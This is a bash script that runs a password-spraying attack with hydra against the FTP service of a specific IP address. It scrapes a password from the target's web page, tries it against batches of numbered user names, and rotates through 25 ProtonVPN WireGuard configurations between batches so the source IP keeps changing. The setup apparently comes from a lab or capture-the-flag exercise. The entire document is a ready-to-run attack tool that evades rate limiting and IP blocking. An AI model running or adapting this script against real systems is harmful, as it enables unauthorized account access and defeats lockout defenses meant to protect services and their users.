#!/bin/bash

# You need to prepare 25 wireguard-config files named "config101.conf", "config102.conf", etc.
# in /etc/wireguard/
# I used wireguard-configs from ProtonVPN (free account).
# Then run this script like this:
# ./pwspray_ftp_hydra.sh 120000 120250
# It ran for about 30 minutes for me.
# Then run it again for the second half of users, if necessary.

MYSTART=$1
MYEND=$2
MYCOUNTER=0
MYPASS=$(curl -k https://152.96.14.197 | grep ftp -A 3 | tail -1 | cut -d'>' -f 2 | cut -d'<' -f 1)
echo "Password is set to: ${MYPASS}"

WGCONF=101
rm -f users.txt
echo "Connecting to Wireguard ${WGCONF}..."
sudo wg-quick up config${WGCONF}
echo "Sleeping for 5 seconds..."
sleep 5
#echo "Checking our ip through ifconfig.io:"
#curl ifconfig.io
echo "------------------"

for i in $( seq ${MYSTART} ${MYEND}); do

  ((MYCOUNTER++))
  if [[ $MYCOUNTER -eq 10 ]]; then
    #echo "------------------------------------"
    #cat users.txt
    #echo "------------------------------------"
    hydra -t 1 -s 21 -v -V -w 360 -I -L users.txt -p ${MYPASS} -f ftp://152.96.14.197
    #date
    echo "Disconnecting from Wireguard ${WGCONF}..."
    sudo wg-quick down config${WGCONF}
    echo "Sleeping for 3 seconds..."
    sleep 3
    ((WGCONF++))
    if [[ $WGCONF -eq 126 ]]; then
      echo "No more wireguard servers, exiting..."
      exit 0;
    fi
    MYCOUNTER=0
    MYPASS=$(curl -k https://152.96.14.197 | grep ftp -A 3 | tail -1 | cut -d'>' -f 2 | cut -d'<' -f 1)
    echo "Password is set to: ${MYPASS}"
    echo "Connecting to Wireguard ${WGCONF}..."
    sudo wg-quick up config${WGCONF}
    echo "Sleeping for 5 seconds..."
    sleep 5
    #echo "Checking our ip through ifconfig.io:"
    #curl ifconfig.io
    echo "------------------"
    echo "Deleting users.txt"
    rm -f users.txt
  fi

  echo "user_${i}" >> users.txt

done
